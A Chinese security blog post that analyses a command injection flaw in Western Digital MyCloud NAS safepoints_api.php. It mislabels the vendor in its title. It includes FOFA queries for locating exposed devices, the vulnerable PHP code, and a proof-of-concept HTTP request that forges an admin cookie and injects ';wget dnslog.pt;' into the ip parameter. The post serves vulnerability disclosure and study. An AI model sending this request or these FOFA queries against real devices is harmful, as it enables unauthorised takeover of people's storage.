---
title: "西部数码 NAS safepoints_api.php 命令执行漏洞"
source: https://mrxn.net/jswz/west-nas-safepoints_api-rce.html
asset_dir: assets/西部数码-nas-safepoints_api.php-命令执行漏洞
---

# 西部数码 NAS safepoints\_api.php 命令执行漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2025/9/10 13:02
- 646浏览
- [0评论](#comment)
- 23分钟阅读

深入探索

漏洞扫描服务

SQL

文本剥离工具

---

# 漏洞简介

Western Digital MyCloud NAS是一款网络附加存储设备，旨在提供集中存储和共享解决方案。它允许用户在家中或办公室通过网络访问文件，支持多种设备的备份和共享。Western Digital MyCloud NAS safepoints\_api.php中存在[命令执行](https://mrxn.net/tag/rce)漏洞，攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个web服务器。

漏洞扫描服务

# 影响版本

<=2.11.153（老版本，已发布修复补丁）

# fofa语法

> icon\_hash="-1074357885" && header="X-Powered-By: PHP/5.4.16"
>
> body="\_PROJECT\_MODEL\_ID\_YOSEMITE " && body="\_PROJECT\_MODEL\_ID\_LIGHTNING "

# 漏洞分析

直接看 `safepoints_api.php` 其业务实现逻辑如下

```
<?php
session_start();
$r = new stdClass();
$r->success = false;

include ("../lib/login_checker.php");

/* login_check() return 0: no login, 1: login, admin, 2: login, normal user */
if (login_check() != 1)
{
    echo json_encode($r);
    exit;
}

define('SAFEPOINTS_NETWORK_DISCOVER', '/var/www/xml/discover_remote_nas_devices.xml');
define('SAFEPOINTS_LIST', '/var/www/xml/safepoint_list.xml');
define('SAFEPOINTS_SHARE_LIST', '/var/www/xml/discover_local_nas_share_%s.xml');
define('SAFEPOINTS_RESTORE', '/var/www/xml/sprb.xml');
define('SAFEPOINTS_PASSWORD', '/tmp/_safepoints_pwd.xml');

$action = $_POST['action'];
if ($action == "")  $action = $_GET['action'];
.....
switch ($action)
{
    case "network_get_sharefolder":
{
    $r->status = -1;
    $cnt = 0;

    $ip = $_POST['ip'];
    $user = $_POST['user'];
    $pwd = $_POST['pwd'];

    $cmd = "killall -SIGKILL discover_dev";
    pclose(popen($cmd, 'r'));

    $_filename = sprintf(SAFEPOINTS_SHARE_LIST, $ip);
    @unlink($_filename);
    $cmd = sprintf("discover_dev -q %s -u '%s' -p '%s'", $ip, $user, $pwd);
    pclose(popen($cmd, 'r'));
```

当`$_POST['action']` = `network_get_sharefolder`时，`$ip = $_POST['ip']`、`$user = $_POST['user']`、`$pwd = $_POST['pwd']`这几个参数均是直接拼接进$cmd中，然后调用**popen**进行执行，期间对这几个参数没有过滤或校验，导致了[命令注入](https://mrxn.net/tag/rce)漏洞。尽管此漏洞需要管理员权限才能触发，但可以结合`login_check`的权限绕过达到 RCE的效果。

漏洞扫描服务

类似的问题同样存在于`usb_get_safepoints` `usb_do_recover` `network_share_auth` `network_get_safepoints` `network_do_recover` 操作中，其中`$backup_type` `$restore_source` `$taskname` `$old_taskname`等参数也未被转义。

usb\_get\_safepoints

[![西部数码 NAS safepoints_api.php 命令执行漏洞](images/img-001-fddaf56eca00.webp)](https://image.mrxn.net/89dc082001ba424bbd07651fa87a199d.webp)

usb\_do\_recover

[![西部数码 NAS safepoints_api.php 命令执行漏洞](images/img-002-db58b7e6baa6.webp)](https://image.mrxn.net/a815e7e3913b4a1483fc2e41d9d1d5e3.webp)

network\_share\_auth

[![西部数码 NAS safepoints_api.php 命令执行漏洞](images/img-003-6a3fd4bd2df0.webp)](https://image.mrxn.net/7a13387b91e14451bc7b7f5a4fc10e2e.webp)

network\_get\_safepoints

[![西部数码 NAS safepoints_api.php 命令执行漏洞](images/img-004-80569c06be15.webp)](https://image.mrxn.net/1b07e05a41fe4727868e308e1be18d1b.webp)

network\_do\_recover

[![西部数码 NAS safepoints_api.php 命令执行漏洞](images/img-005-dfeb5f6cbe90.webp)](https://image.mrxn.net/560489668ed34175a911a4bea181ea3c.webp)

# 漏洞复现

> 需要注意source\_dir应为数组形式，否则foreach循环判断会出错
>
> 漏洞扫描服务

```
POST /web/addons/safepoints_api.php HTTP/1.1
Host: west-nas.mrxn.ent
Cookie: isAdmin=1;username=admin
Content-Type: application/x-www-form-urlencoded

ip=;wget dnslog.pt;&action=network_get_sharefolder
```

[![西部数码 NAS safepoints_api.php 命令执行漏洞](images/img-006-f5a49d73f21f.webp)](https://image.mrxn.net/f90926ec77004c57b00b1115a7cbbd9f.webp)

成功在DNSLOG平台收到DNS和HTTP请求

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#php](https://mrxn.net/tag/php)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
- [#rce](https://mrxn.net/tag/rce)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.影响版本](#toc-2-)
- [3.fofa语法](#toc-3-)
- [4.漏洞分析](#toc-4-)
- [5.漏洞复现](#toc-5-)

  
  

![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAGQAAABkCAYAAABw4pVUAAAKaUlEQVR4AeyagXojJwyE/ff937n1WBmQQazXd7l4vx75rI7QjARG4PUl/ed2u/37u/bv109V54sq5zAnPJMrne1Ib81ZzLWck2OVb52x0vxKTA255+3XVXagNeTe6ds79u4bqGoDNwg74j0XhBYo1wqdh9p3rV/BvEaI+lWdrDvj5xqtITm4/c/twNQQiM5DjUdL9WnIGog6OVb5EDroWNUbc6HrR+7VGCLX8wghYjlXcdmrWOblQ9SCGqUZbWrIKNjjn92B3ZCf3e+Xs31rQyCuZp5VV12WYzDrzEtrq2JHnPUZrTdCzA39iwHMMeuFEHyu+6f8b23In1rk31T3jzREp8oG8+kyl9GbDqGHjhXnWEbXyzGIOjl25EPooeOR/ru5P9KQ23ev8i+qtxtysWZPDfG1X+GZ9UO/7q6T86DzEL556zNWnGMQ+dDRnNB1IHiPheJHU3w0ayBqAA4d4lhnHFfJU0Mq0Y793A60hgDt90rw2j9aYj4JELUqfdZVPDznQoyBSt5+v1WSRRB4vOe8DohYIW/1pYe1DoKDc5jnag3Jwe1/bgd2Qz639+XM/+j6/a65sutAv6rmYI6ZEzpX/mgQuTkOvxaDyANyueZ7HcDj4wxoHDDFTDrvd3HfEO/oRfCwIRAnolorBAdU9BTLJ2ci7wGgnT4I/x5+vHKu/Qex+I81ZxFiPuh4NrdaAvQ68OxnPTxzwO2wIbdr/fwVq/kHokvVu/UpOeKkMQ9zLfEya1Yozcog6kLHlVbxPAf0HKh95dicC7PWnBBmHiLmWhmVI4PQABpOtm/ItCWfDeyGfHb/p9nb196JSQGgPXAdhh6D8M1lhDWXdfYh9NAxX337ELzzMkJw0P8Ilfkj3/UrhHXdrD+qn7mcY3/fkLxDF/BbQyC6/2pNEDp3VDjmKGYbudUY5rpjDQgN9JMPPQbhO08IEfO8itkcywjPenEQMecJFZfJl8m3Qeg9Fkojk39krSFHos393A7shvzcXp+aqTVE10kGcd2AVkDx0YDpQW8NzFwrtnCqXOh1oH9MSQvByR8NgoPnHOny9BrLoOvNQ49JI4Meg/ArvWMZIfSqY8u8/dYQB/46vNgbnv6l7u4JIbparVm8zTys9RAc9FPrPCEE75pCxWXyZfJtGssg8gBTT39IasHCAR63PFOqORrMOudAcGOOxtasECI38/uG5N24gL8bcoEm5CW0f6lDXB/omIX2ofMQvq7nK3N+Roh8qD/GXDPn2IfI9VgIEYNzWNWHyFU9m3VHCJEHOO0JnZuDjgGPj05g//r9drGf9lB3t/L6qph5c0LHjlA6G8SJ8FhY5ULoYEbljFbVOBPLdayHPmcVg+DNZYSZgzmWc+zvZ4h34iK4G3KRRngZ7aHuQL6+sL5mEBwco+tC1zmWEYLPsdHPazMHkQfHXwyc67yMcFwja1e+6wtXmlVcObZ9Q1a79HvxX85uD3VXgOPT4k5mdK4xcxD1zK3QOZl3zAhRC8iyUz7w+GpZiV1fCLMOIiZ+NNeD0AAOPaHznoJfA+CxNmB/7b1d7OftZwj0bkL47r7x7HuEyAdaCtBOSwseOJ5TeCBrlHS2FkyOuQqTrLkQ622Bu+NcCA6O8Z7SXvsZ0rbiGs5uyDX60FbRHuowX6vq6jmWsVX7cqDX+gq9BIicI+HRnMqDqPFKJ+0rg6gFNCnQPk4h/DyXfZg5F7EmoznhviHahQtZa0jumH2v02MhRPdhxkqvnDNW5cLzHNas0PNkHqKGOYgx0GTAdPIbeXcg+Ls7vSA46DiJUgC6DsJP9P7amzfjCn67IVdYzF7Dbb4hQLu+1Qb56ldY6asY9DkgfOsgxoBD7W/kLXB3gMc67257wRxr5JeT1w2hz7Ev2RNk3r4F41jxszFpR9s3ZNyRD49bQ+DcafF6IfRwjNZn9AmqMOtGH/pc5mCOmRN6Dug6CN+cdEcGoYeOzoWIeSyEiB3VzJxybK0hWbD9z+3Absjn9r6ceWoIxHWDY/QVE7qy/NFgrmM9dM6xjK6VY+/6EHMc5UFogCbz3Cu00LzHwiqm+MqAxxcUYP6Wdds/H92B6Ya4u0KvTP5o0LtqDiLmPKE5+TaYdeYyQuggMHNV3SqWc+RbI9R4ZRBzAk0CtJMMa78lJAdCr3ltiW7u1JDGbOcjO9D+QOWuQXQSOFyQ9UIL5cs8FgKPU6W4TXGZx0JY66QdDd7Tj/l5rPltOW4fYi6PhdZXKP4dyzU+cEPeWerfp90NuVjPW0NgfS3zmiF0sMastw9dX8V8baHrHDM6b4UQuSv+nbjnFDpPvg1iLgi0JiMEB/X/M2YtdF1riMmNn92B9idcL8MnQOgY9A46Jn5l0PXWOE/oWEaIHPGjwWsO+imE0ANjqdNj4PFlBDiVAzQ9hJ/f31GRrNs35GinPsDthnxg04+mbA3xtcliiKuXY9ZBcDBj1kPwzhOah+Cgf9yYe4WqI3ulG3noc5qDOWZOqHlk8m0ay8ZxjplbobSyzLeG5OD2P7cD7V/qEKfk1VIgdOrsGXM9iDzAofanWdUBHg9F+TaYY+ZcxGMhrPXiZc4TQujl26QZDWad9UYIDeDQaQQe7x34//y29/Y/+dkfWRdrZPt3iK8p9OvjtZoTOgazDnoMwre+QggN9Ic6HMcgeNeDGAMOPSHw+Dh4Cn4N9H5G+6KewJochKhrrsJK/yq2b0jeoQv47aF+tBaI0wD9JOcT4VzHPM5oTui4fBvEHOaEMMcUf2UQeUCTAsubAsFBja1Ics6sG3q9lNpc12iBu7NvyH0TrvTaDblSN+5raQ/1u798+WoJoV9DCN+J8DxWXDky+TYIHXSURmaNUGOZ/DMm7WjOG+MaH3HibdZBXy+EX3GOZXQtiDwg083fN6RtxTWc6aHuTmbMS81x+5mX77hQYxnweKhC/cUAgpfWBs8x1bNZUyFEHvS5Kp1j0PUQvjkhzDHFZV5PheJtEDWyDiJmjXDfEO3C0n6eaM8QiG7B++hlu/serxBijhXv+FgPIg+w5AmBxy3MQYgYzGid5xE6Bl2v+GjWGaHrHcvo/Byzb064b4h35SK4G3KRRngZrSG6Lu+YC1QI/fpC+Lm2cyA4qB++ELxznSeE4OTbrMs4ch4LYV1D/DtWzVnlQ8wJNBp4fNQC+9fvt4v9tBvidUHvFsy+de8i9Fr5NNl3PY+FjkHkKjaaNUIIHXS0XvxoFQeRa0445uUxhB5mzDr7qmerYlNDLNr4mR3YDfnMvi9n/daGQFzb5WxfBMw6mGPj1f5KX0Klh+e61giXhU4QypdVUsVlFZdj0shy7Fsbkgtvf70DR8y3NkTdXtnRIjIHcaKBHD7lA4+vj5UYZg7mmHMhOOhoLmP1fjM/+jDXgx771oaMk+/x+zuwG/L+nv3RjKkh1RXMsTOrgX4FIfwqD4IDKvrx8QPvc7+z3mohrge0NcFr33lC15Vvg6jhsXBqiBM3fmYHWkMgugXn8Gi56vRoWW/uVcx8pR85aRx7F5U72tkazqv0MO9lpcux1pAc3P7ndmA35HN7X878HwAAAP//px1FZgAAAAZJREFUAwB9TnObNvzTHAAAAABJRU5ErkJggg==)

手机扫码阅读
